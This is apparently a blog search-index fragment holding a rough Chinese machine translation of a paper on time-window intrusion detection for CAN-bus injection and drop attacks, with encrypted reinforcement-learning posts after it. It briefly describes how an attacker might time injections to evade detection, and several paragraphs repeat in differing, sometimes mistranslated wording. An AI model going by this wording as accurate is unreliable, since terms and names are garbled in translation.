<p>准确性得分很大程度上受测试数据中大量的负面(非攻击)窗口影响。因此，在最高观测精度点时，检测响应可能不是最佳的。图3、图4、图5分别为注射检测、滴注记录检测和两种检测联合检测的灵敏度、特异性和准确性评分。ARIMA方法和Z-score方法的注射检测和滴注记录检测结果相似，表明两种方法对任何一种攻击都具有可比性。当超过最佳阈值时，这些方法的灵敏度迅速下降。相比之下，监督方法的灵敏度保持不变的阈值测试下降记录检测。当然，灵敏度下降的速度取决于所测试阈值的粒度和范围。例如，测试的阈值范围仅为8到10个分数，在图上显示出较平缓的斜率。即便如此，结果表明了正确选择阈值的重要性。</p>
<p>在趋于平稳之前，所有方法的特异性随着阈值的增加而增加。因此，在较高的阈值水平上，积极的反应更有可能是正确的。然而，由于灵敏度下降，这些方法不太可能检测到攻击，因此导致响应数量的下降。本质上，提高阈值可以让更多的正实例逃避检测;但一旦检测出来，就不太可能出错。</p>
<p>如何选择正确的阈值是敏感性和特异性之间的权衡。</p>
<p>受试者工作特征(ROC)曲线显示了不同检测阈值下的真阳性率(或敏感性)对假阳性率(或1-特异性)的影响。曲线越接近左上角，分类器的灵敏度和特异性越好。一个完美的分类器会产生一条直线，直线沿Y轴向上到顶部，然后水平到右边的[25]。我们的分类器的ROC曲线(图6)是相似的，并且曲线接近于左上角，表明它们在最佳阈值率下在这项任务中表现良好。</p>
<p>图7显示了扩展到所有CAN ID的测试的组合数据包丢弃和注射结果(每个测试的结果非常相似，因此没有单独显示)。这些方法在攻击检测方面仍然显示出一定的成功，但是容量减少了(图8)。特别是，ARIMA评分法和Z评分法的敏感性在比较阈值时有所降低，因此这些方法做出积极回应的可能性相应降低。监督方法在较低的阈值下显示出比其稍低的特异性</p>
<p>这些结果可能反映了许多较低优先级的标识具有较不稳定的广播间隔范围，因此增加了方差；无人监管的方法适应了这种情况，导致他们做出的决策成比例地减少。相比之下，监督方法的固定方差假设确保了它在不考虑数据方差的情况下继续做出相似比例的决策；这些决定变得不那么正确。因此，在测试的中间阈值，监督方法得到了12377个肯定回答，其中17%是正确的，而ARIMA方法只得到1229个肯定回答，其中25%是正确的，而Z评分方法得到了429个肯定回答，其中71%是正确的。</p>
<p>增加窗口大小也被研究(图9)。保持窗口大小小可能是首选，因为它将最小化攻击检测延迟。在阈值保持不变的情况下，增加窗口大小对特异性和准确性影响不大，但确实增加了ARIMA和Z-score方法的灵敏度。这反映了真阳性和假阳性的增加，因此，假设假阳性是要避免的，可能没有什么好处。</p>
<p>、</p>
<p>该研究使用一个时间定义的窗口来检测注射和刷新攻击导致的CAN活动的变化，这可能成为一个越来越大的威胁。分析了三种方法，将窗口内CAN包的每个广播间隔与窗口内具有相同ID的所有包的平均间隔进行比较。这减少了对平均值的计算，因为它们只在每个窗口的末尾计算，而不是在每个包广播时重新计算平均值的移动窗口。</p>
<p>具有高优先级、频繁广播CAN  id的非监督方法(ARIMA和Z-score)，不需要对数据集进行事先分析，其性能可与监督方法相比，后者需要事先分析以确定合适的阈值参数。当所有CAN  id均纳入分析时，检测精度降低。当包含优先级较低、更不稳定的CAN  id时，两种无监督方法受到的影响最大。不过，可以调整一些参数和因素来优化性能，特别是使用ARIMA时，因此进一步的研究可能会提高性能。</p>
<p>研究还强调了确保最佳阈值的重要性。尤其当该值设置过高时，检测方法的灵敏度迅速下降，而当该值设置过低时，特异性下降。尽管如此，本文研究的方法值得进一步研究，以便将其纳入CAN网络安全系统。虽然有监督的方法可以提供更好的结果，但这取决于对目标系统的配置。非监督方法(如ARIMA和Z-score)提供的解决方案可能较少依赖于对特定CAN的分析。</p>
<p>还研究了增加窗口大小(图9)。保持窗口大小较小可能是首选，因为这将最小化攻击检测延迟。在阈值保持不变的情况下，增加窗口大小对特异性和准确性影响不大，但确实增加了ARIMA和Z评分法的敏感性。这反映了真阳性和假阳性的增加，因此假设要避免假阳性可能没有什么好处。</p>
<p>与任何检测系统一样，知道它是如何运行的，可能会鼓励攻击者试图欺骗或绕过它。例如，通过了解现有的广播速率和分析窗口模式，攻击者可能会试图以与窗口边界和窗口内构建规则模式的速率对应的突发方式注入包，以欺骗系统。为每个窗口大小分配一个随机参数可以看作是一种措施。然而，由于系统总是从前一个广播计算时间间隔，即使该广播发生在前一个窗口，它也不太可能被这样的谨慎的定时攻击，尽管这种攻击可能与错误的窗口有关。</p>
<p>这项研究着眼于使用一个时间定义的窗口来检测由注射和再冲击攻击引起的CAN活动的变化，这种攻击可能会成为一种越来越大的威胁汽车变得更加自主和互联。分析了三种方法，将该窗口内的每个局域网数据包的广播间隔与该窗口内具有相同标识的所有数据包的平均值进行比较。这减少了平均值的计算，因为这些仅在每个窗口结束时计算，而不是在每个分组广播时重新计算平均值的移动窗口。</p>
<p>无监督方法(ARIMA和Z评分)具有高优先级、频繁广播的控制器局域网标识，不需要对数据集进行预先分析，其性能与有监督方法相当，有监督方法需要进行预先分析来确定合适的阈值参数。当所有的CAN ID都包括在分析中时，检测精度降低。当包含优先级较低、更不稳定的广播CAN ID时，这两种无监督方法受到的影响最大。不过，有一些参数和因素可以调整以优化性能，尤其是在ARIMA，因此进一步的研究可能会提高性能。</p>
<p>研究还强调了确保最佳阈值的重要性。特别是，如果设置得太高，检测方法的灵敏度会迅速下降，而如果设置得太低，特异性会降低。然而，这里研究的方法值得进一步研究，以纳入一个局域网网络安全系统。虽然有监督的方法可以给出更好的结果，但这取决于它是为目标系统配置的。无监督方法(如ARIMA和Z-score)提供的解决方案可能不太依赖于对特定CAN的分析。</p>
<p>与任何检测系统一样，对其运行方式的了解可能会鼓励攻击者试图欺骗或规避它。例如，在已知现有广播速率和分析窗口模式的情况下，攻击者可能会试图以对应于窗口边界的突发形式注入数据包，并以在窗口内构建规则模式的速率注入数据包，以试图欺骗系统。给每个窗口大小分配一个随机参数可能被认为是一种反措施。但是，由于系统总是计算前一次广播的时间间隔，即使该广播发生在前一个窗口中，也不太可能被这种精心安排的攻击所欺骗，尽管该攻击可能与错误的窗口相关联。</p>
<h2 id="未来工作"><a href="#未来工作" class="headerlink" title="未来工作"></a>未来工作</h2><p>这项研究着眼于一辆车的数据，以及有限的驾驶可能性。进一步的调查将涉及更广泛的车辆和行程类型。我们测试了两种类型的攻击，仅限于注入单个记录和短时间内丢弃记录。调查进一步的攻击，例如跨越多个窗口的攻击，或者以不同的速率注入记录，可能会导致这些方法产生不同的检测模式。就检测率而言，需要探索数据包的特征。虽然我们将最高优先级数据包的结果与完整数据包的结果进行了比较，但我们尚未量化数据包特征和检测性能之间的关系。更清楚地了解这些可能会更好地告知特定电子控制单元检测方法的适用性。还需要调查其他车辆的广播模式和最佳阈值。</p>
<p>虽然我们的研究只关注了时间上的变化，但我们承认，攻击模式的设计可能不会在网络数据包的时间或频率上产生明显的差异。例如，frschle和sth  ring[12]概述了静默攻击，然后模拟电子控制单元，而不会在消息模式中留下任何痕迹。泰勒等人也考虑了类似的攻击。基于时间的入侵检测无法检测到此类攻击，这表明需要内置的安全措施，如强大的访问控制和消息身份验证，以及可以确定有效负载差异的检测方法，这也是我们正在探索的一个方面。</p>
<p>我们也认识到，防止袭击很重要，特别是对再次袭击这样的袭击，这种袭击一旦发生可能很难应对。然而，在这里，一些攻击之前可能会有其他具有可检测的广播速率变化的攻击，例如获取系统信息的模糊攻击。显然，这里需要更多的研究，包括检测和响应。</p>
<p>我们的攻击模拟是通过直接修改捕获的数据文件生成的。这意味着，即使攻击会导致局域网改变其后续行为，在我们的模拟中也不会观察到数据的下游变化。这是一个更具挑战性的限制，因为我们不能对行驶中的汽车进行攻击。一种可能性是使用一个测试平台来创建数据，如福勒等人[27]提出的。这将提供更真实的数据，因为数据中会捕捉到连锁效应；例如，一个更高优先级的标识的频率变化引起的一个局域网标识频率的变化。虽然对没有备用汽车和测试轨道的研究人员来说，产生实际的攻击是有问题的，但是可以模拟局域网，例如使用专有软件和接口硬件。</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>论文阅读</tag>
        <tag>CAN总线</tag>
      </tags>
  </entry>
  <entry>
    <title>MAB</title>
    <url>/2022/11/13/%E5%AD%A6%E4%B9%A0/RL/MAB/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="5fcb5b2cd6504e5873e31e268068b901ccc533459906e7213ad1163a9001b92b"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">****</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>学习</category>
        <category>RL</category>
      </categories>
      <tags>
        <tag>RL</tag>
        <tag>MDP</tag>
      </tags>
  </entry>
  <entry>
    <title>MDP-1</title>
    <url>/2022/11/13/%E5%AD%A6%E4%B9%A0/RL/MDP-1/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="04a3081669bc511827e622d87a2a00a57c6c01365cbe453615fcfcf7c80b7eed"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">****</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>学习</category>
        <category>RL</category>
      </categories>
      <tags>
        <tag>RL</tag>
        <tag>MDP</tag>
      </tags>
  </entry>
  <entry>
    <title>MDP</title>
    <url>/2022/11/13/%E5%AD%A6%E4%B9%A0/RL/MDP-2/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="005227b218a52d74dead400e45ec3b57e6dc9c89bfbef1132d50390311db1b43"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">****</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>学习</category>
        <category>RL</category>
      </categories>
      <tags>
        <tag>RL</tag>
        <tag>MDP</tag>
      </tags>
  </entry>
</search>
